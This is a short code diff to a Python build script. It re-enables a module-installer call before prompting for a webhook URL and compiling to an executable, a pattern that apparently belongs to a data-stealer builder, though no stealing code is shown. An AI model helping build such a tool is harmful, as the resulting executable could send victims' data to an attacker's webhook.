@@ -11,7 +11,7 @@ class Build:
         self.compileToExe()
     def compileToExe(self):
         try:
-            #self.moduleInstaller()
+            self.moduleInstaller()
             os.system("cls")
             getWebhook = str(input('Enter Your webhook URL : '))
             time.sleep(0.5)
